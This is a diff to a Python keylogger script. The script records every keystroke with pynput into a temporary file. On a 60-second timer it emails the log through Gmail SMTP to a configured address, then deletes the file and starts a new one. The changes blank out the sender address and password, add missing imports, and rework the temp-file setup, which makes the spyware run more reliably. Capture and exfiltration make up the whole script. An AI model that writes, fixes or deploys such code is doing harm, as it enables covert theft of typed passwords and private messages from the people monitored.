@@ -1,4 +1,3 @@
-
 # All imports
 from pynput.keyboard import Listener #1
 import smtplib #2
@@ -9,6 +8,9 @@ from email import encoders
 import socket #3
 import tempfile #4
 from datetime import date #5
+import threading
+import time
+import os
 
 # functions
 def writetofile(key):
@@ -24,8 +26,8 @@ def writetofile(key):
         f.write(char)
         
 def emailsender():
-    fromadd = "my_email"
-    toadd = "my_email"
+    fromadd = "---" #add from address
+    toadd = "---" #add to address
 
     msg = MIMEMultipart()
 
@@ -47,7 +49,7 @@ def emailsender():
     smtpobj = smtplib.SMTP('smtp.gmail.com', 587)
     smtpobj.ehlo()
     smtpobj.starttls()
-    smtpobj.login(fromadd ,'my_password') # add password 
+    smtpobj.login(fromadd ,'---') # add password 
     text = msg.as_string()
     smtpobj.sendmail(fromadd , toadd , text)
     smtpobj.quit() 
@@ -62,18 +64,20 @@ def is_connected():
 
         
 def filecreation():
+    save = tempfile.mkdtemp('file') 
+    print (save)
+    global filename
     filename = save + '\\keylg' + '.txt'
     a = open (filename, "w+")
-    a.write(str(date.today())) 
+    a.write(str(date.today())+"\n") 
 
 # main    
-save = tempfile.mkdtemp('file') 
-print (save)
 filecreation()
 
 if is_connected() == True:
     def join():
         with Listener(on_press=writetofile) as ls:
+            period_sec=10
             def time_out(period_sec: int):
                 time.sleep(period_sec)  # Listen to keyboard for period_sec seconds
                 ls.stop()
@@ -81,7 +85,7 @@ if is_connected() == True:
                 os.remove(filename)
                 filecreation()
                 
-            Thread(target=time_out, args=(60.0,)).start() #listening for 60 seconds. 
+            threading.Thread(target=time_out, args=(60.0,)).start() #listening for 60 seconds. 
             ls.join()
     
     while True:
